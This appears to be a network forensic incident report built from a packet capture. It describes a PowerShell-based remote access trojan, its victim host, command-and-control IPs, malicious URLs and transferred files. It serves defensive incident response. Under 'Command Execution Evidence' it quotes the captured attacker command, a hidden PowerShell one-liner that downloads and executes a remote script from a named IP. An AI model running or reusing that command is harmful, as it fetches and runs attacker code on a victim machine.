Based on my analysis of the PCAP file, here is the incident report:

---

## INCIDENT REPORT: Network Forensic Analysis
**Date of Incident:** 2025-01-22  
**Analysis Date:** 2025-07-25

### INFECTED/VICTIM HOST

**IPv4 Address:** 10.1.17.215  
**MAC Address:** 00:d0:b7:26:4a:74  
**Windows Hostname:** DESKTOP-L8C5GSJ  
**Domain:** bluemoontuesday.com  
**Logged-In User:** Unable to determine from traffic (no explicit NTLM/Kerberos user binding captured)

---

### MALWARE IDENTIFICATION

**Family:** PowerShell-based Remote Access Trojan (RAT)  
**Attribution Confidence:** Behavioral (signature-confirmed via PowerShell download chain and TeamViewer masquerading)

**Key Characteristics:**
- Executes PowerShell scripts with hidden window mode (`-WindowStyle Hidden`)
- Downloads malicious payloads masquerading as legitimate TeamViewer binaries
- Uses HTTP for command-and-control communication
- Maintains persistence via startup shortcut creation
- Communicates status and execution results via HTTP parameters

---

### INDICATORS OF COMPROMISE

**Command-and-Control Endpoints:**
- 45.125.66.32:2917 (TCP, high-volume data transfer, 10.1 MB, ~1,720 seconds duration)
- 5.252.153.241:80 (HTTP API, file downloads and C&C polling)

**Malicious Domains:** None explicitly resolved; traffic directed to IP addresses only

**Malicious URLs:**
- http://5.252.153.241:80/api/file/get-file/264872
- http://5.252.153.241:80/api/file/get-file/29842.ps1
- http://5.252.153.241:80/api/file/get-file/TeamViewer
- http://5.252.153.241:80/api/file/get-file/Teamviewer_Resource_fr
- http://5.252.153.241:80/api/file/get-file/TV
- http://5.252.153.241:80/api/file/get-file/pas.ps1
- http://5.252.153.241:80/1517096937 (C&C polling endpoint with status parameters)

**Transferred Files:**
- 264872 (binary executable, unknown type)
- 29842.ps1 (PowerShell script)
- TeamViewer (trojaned binary, not legitimate TeamViewer)
- Teamviewer_Resource_fr (trojaned resource file)
- TV (trojaned binary, truncated name)
- pas.ps1 (PowerShell script)

**SHA256 Hashes:** Not obtainable from PCAP alone (full payloads would need extraction from raw TCP streams)

**Command Execution Evidence:**
```
cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command 
  "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).'DownloadString'
  ('http://5.252.153.241:80/api/file/get-file/29842.ps1');#URL: https://teams.microsoft.com"
```

**C&C Status Messages:**
- "startup shortcut created; status = success" (persistence mechanism)
- "script: RunRH, status: OK, message: PS process started" (command execution acknowledgement)

---

### ATTACK TIMELINE
- Malware initiated PowerShell download chain shortly after (timestamp: 2025-01-22 23:47 UTC+4)
- Large data exfiltration to 45.125.66.32:2917 occurred over extended period (1,720+ seconds)
- Multiple TeamViewer impersonation payloads downloaded across capture duration
- Repeated C&C polling to /1517096937 endpoint throughout traffic window
